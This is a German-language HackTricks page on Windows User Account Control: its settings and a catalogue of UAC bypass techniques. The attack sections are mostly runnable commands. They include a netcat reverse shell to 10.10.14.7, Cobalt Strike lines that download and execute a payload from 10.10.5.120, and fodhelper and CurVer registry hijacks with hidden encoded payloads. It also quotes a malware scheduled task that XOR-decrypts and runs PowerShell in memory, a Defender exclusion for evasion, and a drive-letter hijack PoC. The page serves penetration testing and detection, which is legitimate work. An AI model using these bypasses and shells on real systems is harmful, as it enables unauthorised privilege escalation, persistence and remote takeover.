# UAC - Benutzerkontensteuerung

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ist eine Funktion, die eine **Zustimmungsaufforderung für Aktionen mit erhöhten Rechten** ermöglicht. Anwendungen haben unterschiedliche `integrity` levels, und ein Programm mit einem **hohen Level** kann Aufgaben ausführen, die das System **potenziell kompromittieren** könnten. Wenn UAC aktiviert ist, laufen Anwendungen und Aufgaben immer **im Sicherheitskontext eines Nicht-Administrator-Kontos**, es sei denn, ein Administrator gewährt diesen Anwendungen/Aufgaben ausdrücklich Administratorzugriff, um ausgeführt zu werden. Es ist eine Komfortfunktion, die Administratoren vor unbeabsichtigten Änderungen schützt, aber nicht als Sicherheitsgrenze gilt.

Weitere Informationen zu Integritätsstufen:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Wenn UAC aktiv ist, erhält ein Administratorbenutzer zwei Tokens: ein Standardbenutzertoken, um normale Aktionen auf Standardniveau auszuführen, und eines mit Administratorprivilegien.

Diese [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) erläutert ausführlich, wie UAC funktioniert und behandelt den Anmeldeprozess, die Benutzererfahrung und die UAC-Architektur. Administratoren können Sicherheitsrichtlinien verwenden, um zu konfigurieren, wie UAC für ihre Organisation lokal funktioniert (mittels secpol.msc), oder zentral über Group Policy Objects (GPO) in einer Active Directory-Domänenumgebung verteilt wird. Die verschiedenen Einstellungen werden detailliert [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) beschrieben. Es gibt 10 Group Policy-Einstellungen, die für UAC gesetzt werden können. Die folgende Tabelle liefert zusätzliche Details:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Deaktiviert)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Aufforderung zur Zustimmung für nicht-Windows-Binärdateien auf dem sicheren Desktop) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Aufforderung nach Anmeldeinformationen auf dem sicheren Desktop)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Aktiviert; in Enterprise standardmäßig deaktiviert)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Deaktiviert)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Aktiviert)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Aktiviert)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Deaktiviert)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Aktiviert)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Aktiviert)                                              |

### Richtlinien zur Installation von Software unter Windows

Die **lokalen Sicherheitsrichtlinien** ("secpol.msc" auf den meisten Systemen) sind standardmäßig so konfiguriert, dass sie **Nicht-Administratoren daran hindern, Softwareinstallationen durchzuführen**. Das bedeutet, dass selbst wenn ein Nicht-Administrator den Installer für Ihre Software herunterladen kann, er ihn ohne ein Administratorkonto nicht ausführen kann.

### Registrierungsschlüssel, um UAC zur Abfrage einer Erhöhung zu zwingen

Als Standardbenutzer ohne Administratorrechte können Sie sicherstellen, dass das "Standard"-Konto von UAC **um Anmeldeinformationen aufgefordert wird**, wenn es versucht, bestimmte Aktionen auszuführen. Diese Maßnahme würde das Ändern bestimmter **Registrierungsschlüssel** erfordern, wofür Sie Administratorrechte benötigen, es sei denn, es existiert ein **UAC bypass** oder der Angreifer ist bereits als Administrator eingeloggt.

Selbst wenn sich der Benutzer in der **Administrators**-Gruppe befindet, zwingen diese Änderungen den Benutzer dazu, seine Kontenanmeldeinformationen **erneut einzugeben**, um administrative Aktionen durchzuführen.

**Der einzige Nachteil ist, dass dieser Ansatz UAC deaktiviert benötigt, um zu funktionieren, was in Produktionsumgebungen unwahrscheinlich ist.**

Die Registrierungsschlüssel und Einträge, die Sie ändern müssen, sind die folgenden (mit ihren Standardwerten in Klammern):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Dies kann auch manuell über das Tool "Local Security Policy" durchgeführt werden. Nach der Änderung werden administrative Vorgänge den Benutzer dazu auffordern, seine Anmeldeinformationen erneut einzugeben.

### Hinweis

**User Account Control ist keine Sicherheitsgrenze.** Daher können Standardbenutzer nicht aus ihren Konten ausbrechen und Administratorrechte erlangen, ohne einen local privilege escalation exploit.

### Fordere 'vollen Computerzugriff' von einem Benutzer an
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC-Berechtigungen

- Internet Explorer Protected Mode verwendet Integritätsprüfungen, um zu verhindern, dass Prozesse mit hohem Integritätslevel (wie Webbrowser) auf Daten mit niedrigem Integritätslevel (wie den Ordner für temporäre Internetdateien) zugreifen. Dies wird erreicht, indem der Browser mit einem Low-Integrity-Token ausgeführt wird. Wenn der Browser versucht, auf Daten in der Low-Integrity-Zone zuzugreifen, prüft das Betriebssystem das Integritätslevel des Prozesses und gewährt den Zugriff entsprechend. Diese Funktion hilft zu verhindern, dass Remote-Code-Ausführungsangriffe Zugriff auf sensible Daten auf dem System erhalten.
- Wenn sich ein Benutzer bei Windows anmeldet, erstellt das System ein Access-Token, das eine Liste der Benutzerprivilegien enthält. Privilegien sind die Kombination aus Rechten und Fähigkeiten eines Benutzers. Das Token enthält außerdem eine Liste der Benutzeranmeldeinformationen, also der Credentials, die zur Authentifizierung des Benutzers gegenüber dem Computer und Netzwerkressourcen verwendet werden.

### Autoadminlogon

Um Windows so zu konfigurieren, dass ein bestimmter Benutzer beim Start automatisch angemeldet wird, setzen Sie den **`AutoAdminLogon` registry key**. Das ist nützlich für Kiosk-Umgebungen oder Testzwecke. Verwenden Sie dies nur auf sicheren Systemen, da das Passwort in der Registry preisgegeben wird.

Setzen Sie die folgenden Keys mit dem Registry-Editor oder `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Um zum normalen Anmeldeverhalten zurückzukehren, setzen Sie `AutoAdminLogon` auf 0.

## UAC bypass

> [!TIP]
> Beachten Sie, dass wenn Sie grafischen Zugriff auf das Opfer haben, ein UAC bypass sehr einfach ist, da Sie beim Erscheinen der UAC-Eingabeaufforderung einfach auf "Yes" klicken können

Der UAC bypass wird in folgendem Fall benötigt: **UAC ist aktiviert, Ihr Prozess läuft in einem mittleren Integritätskontext, und Ihr Benutzer gehört zur Administrators-Gruppe**.

Wichtig ist zu erwähnen, dass es **viel schwieriger ist, UAC zu umgehen, wenn es auf dem höchsten Sicherheitslevel (Always) eingestellt ist, als wenn es auf einem der anderen Level (Default) steht.**

### UAC disabled

Wenn UAC bereits deaktiviert ist (`ConsentPromptBehaviorAdmin` ist **`0`**) können Sie **eine reverse shell mit Admin-Rechten** (hohes Integritätslevel) ausführen, z. B. mit:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Sehr** grundlegender UAC "bypass" (vollständiger Dateisystemzugriff)

Wenn du eine Shell mit einem Benutzer hast, der zur Administrators group gehört, kannst du **das C$-Share über SMB lokal in ein neues Laufwerk mounten** und hast dadurch **Zugriff auf alles im Dateisystem** (sogar auf den Administrator-Home-Ordner).

> [!WARNING]
> **Sieht so aus, als würde dieser Trick nicht mehr funktionieren**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass mit cobalt strike

Die Cobalt Strike-Techniken funktionieren nur, wenn UAC nicht auf seine maximale Sicherheitsstufe eingestellt ist.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** und **Metasploit** haben ebenfalls mehrere Module, um die **UAC** zu **bypass**.

### KRBUACBypass

Dokumentation und Tool unter [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass Exploits

[**UACME** ](https://github.com/hfiref0x/UACME), welches eine **Kompilation** mehrerer UAC bypass Exploits ist. Beachte, dass du **UACME mit Visual Studio oder msbuild kompilieren** musst. Die Kompilierung erstellt mehrere ausführbare Dateien (z. B. `Source\Akagi\outout\x64\Debug\Akagi.exe`), du musst wissen, **welche du brauchst.**\
Du solltest **vorsichtig sein**, weil einige Bypasses andere Programme **aufrufen**, die den **Benutzer** **warnen**, dass etwas passiert.

UACME enthält die **Build-Version, ab der jede Technik funktionierte**. Du kannst nach einer Technik suchen, die deine Versionen betrifft:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Außerdem erhält man über die [this](https://en.wikipedia.org/wiki/Windows_10_version_history) Seite die Windows-Release `1607` aus den Build-Versionen.

### UAC Bypass – fodhelper.exe (Registry hijack)

Die vertrauenswürdige Binary `fodhelper.exe` wird in modernen Windows automatisch erhöht. Beim Start fragt sie den unten stehenden, pro-Benutzer-Registrierungspfad ab, ohne das `DelegateExecute`-Verb zu validieren. Dort einen Befehl zu platzieren erlaubt einem Medium Integrity-Prozess (Benutzer ist in Administrators), einen High Integrity-Prozess ohne UAC-Aufforderung zu starten.

Vom fodhelper abgefragter Registrierungspfad:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell-Schritte (payload setzen, dann auslösen)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Hinweise:
- Funktioniert, wenn der aktuelle Benutzer Mitglied der Gruppe Administrators ist und das UAC-Level standardmäßig/locker eingestellt ist (nicht Always Notify mit zusätzlichen Einschränkungen).
- Verwende den `sysnative`-Pfad, um eine 64-Bit PowerShell aus einem 32-Bit-Prozess auf 64-Bit-Windows zu starten.
- Die Payload kann jeder Befehl sein (PowerShell, cmd oder ein EXE-Pfad). Vermeide UI-Prompts für bessere Tarnung.

#### CurVer/extension hijack variant (HKCU only)

Neuere Samples, die `fodhelper.exe` missbrauchen, umgehen `DelegateExecute` und stattdessen **redirect the `ms-settings` ProgID** über den pro-Benutzer-`CurVer`-Wert. Die auto-elevated binary löst den Handler weiterhin unter `HKCU` auf, sodass kein Admin-Token benötigt wird, um die Schlüssel zu setzen:
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Sobald es erhöhte Rechte erlangt hat, deaktiviert Malware üblicherweise **zukünftige Eingabeaufforderungen**, indem sie `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` auf `0` setzt, führt dann zusätzliche defense evasion (z. B. `Add-MpPreference -ExclusionPath C:\ProgramData`) durch und stellt persistence wieder her, um mit hoher Integrität zu laufen. Eine typische persistence task speichert ein **XOR-encrypted PowerShell script** auf der Festplatte und decodiert/führt es jede Stunde im Speicher aus:
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Diese Variante räumt den dropper weiterhin auf und lässt nur die staged payloads zurück, wodurch die Erkennung darauf angewiesen ist, die **`CurVer` hijack**, `ConsentPromptBehaviorAdmin`-Manipulation, die Erstellung von Defender-Ausnahmen oder geplante Tasks zu überwachen, die PowerShell im Speicher entschlüsseln.

#### Weitere UAC-Bypass-Methoden

**Alle** Techniken, die hier verwendet werden, um AUC zu umgehen, **erfordern** eine **vollständige interaktive shell** mit dem Opfer (ein gewöhnliches nc.exe shell reicht nicht).

Du kannst das über eine **meterpreter**-Session bekommen. Migriere in einen **process**, dessen **Session**-Wert gleich **1** ist:

![](<../../images/image (863).png>)

(_explorer.exe_ sollte funktionieren)

### UAC Bypass with GUI

Wenn du Zugriff auf eine **GUI** hast, kannst du einfach die UAC-Aufforderung akzeptieren, wenn sie erscheint — du brauchst dafür eigentlich keinen Bypass. Zugriff auf eine GUI erlaubt es dir also, die UAC zu umgehen.

Außerdem, wenn du eine GUI-Session bekommst, die jemand benutzt hat (potenziell via RDP), laufen dort möglicherweise **einige Tools, die als administrator ausgeführt werden**, von denen aus du z.B. ein **cmd** **als admin** direkt starten könntest, ohne erneut von UAC gefragt zu werden, wie z.B. [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Das kann etwas **stealthy** sein.

### Noisy brute-force UAC bypass

Wenn es dir egal ist, laut zu sein, kannst du immer **etwas wie** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) **ausführen**, das **fortlaufend um Elevation der Berechtigungen bittet, bis der Benutzer zustimmt**.

### Your own bypass - Basic UAC bypass methodology

Wenn du dir **UACME** ansiehst, wirst du feststellen, dass **die meisten UAC-Bypässe eine Dll Hijacking vulnerability ausnutzen** (hauptsächlich indem die bösartige dll in _C:\Windows\System32_ geschrieben wird). [Lies das, um zu lernen, wie man eine Dll Hijacking vulnerability findet](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Finde ein Binary, das **autoelevate** (prüfe, dass es beim Ausführen in einem hohen Integritätslevel läuft).
2. Mit procmon finde "**NAME NOT FOUND**"-Ereignisse, die für **DLL Hijacking** anfällig sein können.
3. Wahrscheinlich musst du die DLL in einige **protected paths** schreiben (z. B. C:\Windows\System32), in denen du keine Schreibberechtigung hast. Du kannst das umgehen mit:
   1. **wusa.exe**: Windows 7, 8 und 8.1. Ermöglicht das Extrahieren des Inhalts einer CAB-Datei in protected paths (da dieses Tool mit hoher Integritätsstufe ausgeführt wird).
   2. **IFileOperation**: Windows 10.
4. Bereite ein **script** vor, das deine DLL in den protected path kopiert und das verwundbare, autoelevated Binary ausführt.

### Another UAC bypass technique

Besteht darin zu beobachten, ob ein **autoElevated binary** versucht, aus der **registry** den **name/path** einer **binary** oder eines **command** zu **lesen**, der ausgeführt werden soll (das ist besonders interessant, wenn das Binary diese Information in der **HKCU** sucht).

### Administrator Protection (25H2) drive-letter hijack via per-logon-session DOS device map

Windows 11 25H2 “Administrator Protection” verwendet shadow-admin Tokens mit per-session `\Sessions\0\DosDevices/<LUID>` maps. Das Verzeichnis wird lazy von `SeGetTokenDeviceMap` bei der ersten Auflösung von `\??` erstellt. Wenn der Angreifer das shadow-admin Token nur auf **SecurityIdentification** impersonifiziert, wird das Verzeichnis mit dem Angreifer als **owner** erstellt (erbt `CREATOR OWNER`), wodurch Laufwerksbuchstaben-Links möglich sind, die Vorrang vor `\GLOBAL??` haben.

**Schritte:**

1. Von einer niedrig privilegierten Session aus rufe `RAiProcessRunOnce` auf, um ein promptloses shadow-admin `runonce.exe` zu starten.
2. Dupliziere dessen primären Token zu einem **identification** Token und impersonifiziere ihn beim Öffnen von `\??`, um die Erstellung von `\Sessions\0\DosDevices/<LUID>` unter Angreifer-Besitz zu erzwingen.
3. Erstelle dort einen `C:`-Symlink, der auf angreiferkontrollierten Speicher zeigt; nachfolgende Dateisystemzugriffe in dieser Session lösen `C:` auf den Angreiferpfad auf und ermöglichen DLL-/Datei-Hijack ohne Aufforderung.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## References
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – Wie User Account Control funktioniert](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)
- [Checkpoint Research – KONNI setzt KI ein, um PowerShell Backdoors zu generieren](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [Project Zero – Windows Administrator Protection drive-letter hijack](https://projectzero.google/2026/26/windows-administrator-protection.html)

{{#include ../../banners/hacktricks-training.md}}
